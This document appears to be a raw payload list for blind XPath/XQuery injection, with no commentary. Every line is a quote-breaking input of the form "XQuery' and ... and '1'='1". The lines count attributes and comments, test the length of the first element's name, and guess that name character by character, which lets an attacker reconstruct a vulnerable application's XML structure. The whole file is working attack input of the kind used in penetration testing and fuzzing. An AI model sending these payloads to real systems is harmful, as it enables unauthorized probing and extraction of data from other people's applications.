XQuery' and '1'='1
XQuery' and count(/*)=1 and '1'='1
XQuery' and count(/@*)=1 and '1'='1
XQuery' and count(/@*)=2 and '1'='1
XQuery' and count(/@*)=3 and '1'='1
XQuery' and count(/@*)=4 and '1'='1
XQuery' and count(/@*)=5 and '1'='1
XQuery' and count(/@*)=6 and '1'='1
XQuery' and count(/@*)=7 and '1'='1
XQuery' and count(/@*)=8 and '1'='1
XQuery' and count(/@*)=9 and '1'='1
XQuery' and count(/@*)=10 and '1'='1
XQuery' and count(/@*)=11 and '1'='1
XQuery' and count(/@*)=12 and '1'='1
XQuery' and count(/@*)=13 and '1'='1
XQuery' and count(/@*)=14 and '1'='1
XQuery' and count(/@*)=15 and '1'='1
XQuery' and count(/@*)=16 and '1'='1
XQuery' and count(/@*)=17 and '1'='1
XQuery' and count(/@*)=18 and '1'='1
XQuery' and count(/@*)=19 and '1'='1
XQuery' and count(/@*)=20 and '1'='1
XQuery' and count(/comment())=1 and '1'='1
XQuery' and count(/comment())=2 and '1'='1
XQuery' and count(/comment())=3 and '1'='1
XQuery' and count(/comment())=4 and '1'='1
XQuery' and count(/comment())=5 and '1'='1
XQuery' and count(/comment())=6 and '1'='1
XQuery' and count(/comment())=7 and '1'='1
XQuery' and count(/comment())=8 and '1'='1
XQuery' and count(/comment())=9 and '1'='1
XQuery' and count(/comment())=10 and '1'='1
XQuery' and count(/comment())=11 and '1'='1
XQuery' and count(/comment())=12 and '1'='1
XQuery' and count(/comment())=13 and '1'='1
XQuery' and count(/comment())=14 and '1'='1
XQuery' and count(/comment())=15 and '1'='1
XQuery' and count(/comment())=16 and '1'='1
XQuery' and count(/comment())=17 and '1'='1
XQuery' and count(/comment())=18 and '1'='1
XQuery' and count(/comment())=19 and '1'='1
XQuery' and count(/comment())=20 and '1'='1
XQuery' and string-length(name(/*[1]))=1 and '1'='1
XQuery' and string-length(name(/*[1]))=2 and '1'='1
XQuery' and string-length(name(/*[1]))=3 and '1'='1
XQuery' and string-length(name(/*[1]))=4 and '1'='1
XQuery' and string-length(name(/*[1]))=5 and '1'='1
XQuery' and string-length(name(/*[1]))=6 and '1'='1
XQuery' and string-length(name(/*[1]))=7 and '1'='1
XQuery' and substring(name(/*[1]),1,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='b' and '1'='1
XQuery' and substring(name(/*[1]),1,1)='c' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='H' and '1'='1
